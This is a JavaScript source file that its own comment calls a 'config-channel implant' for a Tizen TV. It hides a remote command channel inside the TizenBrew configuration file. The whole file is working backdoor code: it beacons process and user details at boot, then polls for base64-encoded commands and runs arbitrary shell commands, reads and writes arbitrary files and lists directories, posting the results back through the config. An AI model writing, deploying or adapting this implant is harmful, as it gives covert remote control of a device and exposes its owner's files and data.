"use strict";
/* Config-channel implant.
   PC -> TV : ModuleAction add  "CMD_<id>_<b64url(op\nargs...)>"
   TV -> PC : GetModules(true) returns "RES_<id>_<b64url(json)>"
   Node 4.4.3 / uid 5001. */

var fs = require('fs');
var CFG = '/home/owner/share/tizenbrewConfig.json';

function b64e(s) {
    return new Buffer(s, 'utf8').toString('base64')
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function b64d(s) {
    return new Buffer(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}
function readCfg() {
    try { return JSON.parse(fs.readFileSync(CFG, 'utf8')); }
    catch (e) { return { modules: [], autoLaunchServiceList: [], autoLaunchModule: '' }; }
}
function writeCfg(c) {
    try { fs.writeFileSync(CFG, JSON.stringify(c, null, 4)); } catch (e) {}
}

var cp = null;
try { cp = require('child_process'); } catch (e) {}

// boot announcement
try {
    var c0 = readCfg();
    if (!c0.modules) c0.modules = [];
    c0.modules.push('BOOT_' + b64e(JSON.stringify({
        node: process.version,
        uid: (typeof process.getuid === 'function') ? process.getuid() : null,
        gid: (typeof process.getgid === 'function') ? process.getgid() : null,
        cp: !!cp,
        cwd: (typeof process.cwd === 'function') ? process.cwd() : null,
        argv: process.argv
    })));
    writeCfg(c0);
} catch (e) {}

function doOp(payload) {
    var nl = payload.indexOf('\n');
    var op = nl < 0 ? payload : payload.slice(0, nl);
    var rest = nl < 0 ? '' : payload.slice(nl + 1);

    if (op === 'exec') {
        var out = {};
        if (!cp) { out.error = 'no child_process'; return out; }
        try {
            out.stdout = cp.execSync(rest, { encoding: 'utf8', timeout: 25000, maxBuffer: 8 * 1024 * 1024 });
        } catch (e) {
            out.error = String(e);
            try { out.stdout = e.stdout ? String(e.stdout) : ''; } catch (e2) {}
            try { out.stderr = e.stderr ? String(e.stderr) : ''; } catch (e3) {}
        }
        return out;
    }
    if (op === 'read') {
        var b = fs.readFileSync(rest);
        return { size: b.length, b64: b.toString('base64') };
    }
    if (op === 'readchunk') {
        var spec = rest.split('\n');
        var p = spec[0], off = parseInt(spec[1], 10) || 0, len = parseInt(spec[2], 10) || 65536;
        var fd = fs.openSync(p, 'r');
        var buf = new Buffer(len);
        var n = fs.readSync(fd, buf, 0, len, off);
        fs.closeSync(fd);
        return { size: n, off: off, b64: buf.slice(0, n).toString('base64') };
    }
    if (op === 'write') {
        var sp = rest.split('\n');
        var data = new Buffer(sp[1] || '', 'base64');
        fs.writeFileSync(sp[0], data);
        return { written: data.length, path: sp[0] };
    }
    if (op === 'ls') {
        var items = fs.readdirSync(rest);
        return { path: rest, count: items.length, entries: items };
    }
    if (op === 'stat') {
        var st = fs.statSync(rest);
        return {
            path: rest, size: st.size, mode: st.mode, uid: st.uid, gid: st.gid,
            isDir: st.isDirectory(), isFile: st.isFile(), mtime: st.mtime
        };
    }
    if (op === 'readlink') {
        return { path: rest, target: fs.readlinkSync(rest) };
    }
    return { error: 'unknown op: ' + op };
}

var busy = false;

function handle(entry) {
    var rest = entry.slice(4);          // strip CMD_
    var i = rest.indexOf('_');
    if (i < 0) return;
    var id = rest.slice(0, i);
    var payload;
    try { payload = b64d(rest.slice(i + 1)); } catch (e) { payload = 'read\n/nonexistent'; }

    var result;
    try { result = doOp(payload); }
    catch (e) { result = { error: String(e) }; }

    var c = readCfg();
    c.modules = (c.modules || []).filter(function (m) { return m !== entry; });
    c.modules.push('RES_' + id + '_' + b64e(JSON.stringify(result)));
    writeCfg(c);
}

function tick() {
    if (busy) { return setTimeout(tick, 800); }
    busy = true;
    try {
        var c = readCfg();
        var cmds = (c.modules || []).filter(function (m) { return m.indexOf('CMD_') === 0; });
        for (var i = 0; i < cmds.length; i++) { handle(cmds[i]); }
    } catch (e) {}
    busy = false;
    setTimeout(tick, 800);
}

tick();
